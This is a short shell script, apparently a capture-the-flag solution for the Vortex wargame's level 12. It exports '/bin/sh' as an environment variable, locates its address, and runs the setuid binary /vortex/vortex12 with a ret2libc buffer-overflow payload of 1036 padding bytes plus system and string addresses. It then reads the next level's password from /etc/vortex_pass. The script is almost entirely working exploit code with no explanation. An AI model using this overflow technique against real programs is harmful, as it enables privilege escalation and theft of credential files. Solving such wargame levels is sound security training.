#!/bin/sh

mkdir /tmp/ballban_vortex12
cd /tmp/ballban_vortex12

export EGG="/bin/sh"

# Create check_env.c and compile
nano check_env.c
gcc -m32 check_env.c -o check_env

# Check address of EGG and put EGG's address in EGG2
./check_env EGG # 0xffffddf5

/vortex/vortex12 $(python3 -c "import sys; import struct; sys.stdout.buffer.write(b'A' * 1036 + struct.pack('<I', 0xf7e5fe40) + struct.pack('<I', 0xffffddf5))")

cat /etc/vortex_pass/vortex13
# Password: 